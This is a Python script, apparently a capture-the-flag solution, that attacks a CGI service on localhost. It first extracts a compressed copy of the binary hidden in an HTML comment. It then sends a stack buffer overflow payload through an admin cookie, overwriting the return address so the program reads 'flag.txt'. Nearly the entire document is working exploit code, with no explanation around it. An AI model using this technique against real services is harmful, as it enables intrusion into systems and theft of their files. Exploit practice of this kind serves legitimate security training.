#!/usr/bin/env python

import os
import sys
import socket
import urllib
import gzip
import base64
import requests
from cStringIO import StringIO

cnt = requests.get('http://localhost:8080/index.cgi?%E6%9C%AA%E6%9D%A5%E9%81%93%E5%85%B78%E5%8F%B7%E6%9C%BA').text
cnt = cnt[cnt.find('<!--')+4: cnt.find('-->')].strip().replace('\n', '').replace('', '')
cnt = base64.b64decode(cnt)

fobj = StringIO(cnt)
gz = gzip.GzipFile(fileobj=fobj)
with open('/tmp/index.cgi', 'wb') as f:
    f.write(gz.read())

# Demo stage 2: stack overflow
payload = ('a'*0x50)
payload += (
    ('A' * 4) +     # Old EBP
    ('\x9F\x8A\x04\x08') +  # return to readimage
    ('A' * 4) +     # Fake new eip
    ('\xC2\x99\x04\x08')    # 'flag.txt'
)

sck = socket.socket()
sck.connect(('localhost', 8080))
f = sck.makefile()
f.write('GET /index.cgi?flag.txt HTTP/1.1\r\n'
        'Host: localhost:8080\r\n'
        'Connection: close\r\n'
        'Cookie: ' + ('admin=' + urllib.quote(payload) + '%3A1') + '\r\n'
        '\r\n')
f.flush()
print(f.read())
